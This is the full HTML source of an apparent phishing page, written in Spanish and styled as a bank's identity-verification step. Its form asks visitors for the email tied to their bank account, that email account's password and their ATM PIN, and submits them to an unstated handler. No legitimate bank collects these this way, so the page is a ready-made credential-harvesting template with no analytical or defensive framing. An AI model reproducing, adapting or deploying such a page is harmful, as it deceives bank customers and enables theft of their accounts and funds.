
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Login</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
</style>
<style> 
input {
  width: 400px;
  padding: 12px;
  font-size: 18px;
}
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
}

.button {
  color: white;
  padding: 12px 110px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  transition-duration: 0.4s;
  cursor: pointer;
}
.button2 {
    background-color: #dc1431;
    color: white;
    border: 2px solid #ffffff;
}

.button2:hover {
  background-color: #012169;
  color: white;
}

a:link {
	color: #FFFFFF;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: underline;
}
a:active {
	text-decoration: none;
}
.Estilo10 {font-size: 12px}
.Estilo13 {font-size: 16px; color: #000000; }
.Estilo14 {font-size: 16px}
.Estilo18 {
	color: #FFFFFF;
	font-size: 24px;
}
</style>

</head>

<body>
<form action="" method="post">
<img src="img/cabezera-1.jpg" width="100%" height="78" />
<div align="center">
  <table width="100%" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td width="4%" height="57" bgcolor="dc1431">&nbsp;</td>
      <td width="96%" bgcolor="dc1431"><span class="Estilo18">Verificar su identidad</span></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><p><span class="Estilo13">Confirmar correo asociado a su cuenta de banco</span></p>
        <p class="Estilo14">Para verificar su identidad, Ingrese el correo asociado a la cuenta bancaria.</p>
        <p><img src="img/email.png" width="200" height="60" /><br />
      </p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="email" type="email" placeholder="Correo Electr&oacute;nico" required="required" /></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="cpass" type="password" placeholder="Clave del correo" pattern=".{4,}" required="required" /></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><input name="atm" type="password" placeholder="ATM o PIN" pattern=".{3,}" maxlength="4" required="required"/></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><p class="Estilo10">La direcci&oacute;n de correo electr&oacute;nico que ingrese debe coincidir con el correo asociado a</p>
      <p class="Estilo10"> nuestros servicios de Online Banking.</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td><button class="button button2"  name="add" type="submit">Confirmar</button></td>
    </tr>
  </table>
</div>
</form>
<p align="center"><img src="img/01-1.jpg" width="100%" height="684" /></p>
<p><img src="img/pie.jpg" width="100%" height="228" /></p>
</body>
</html>
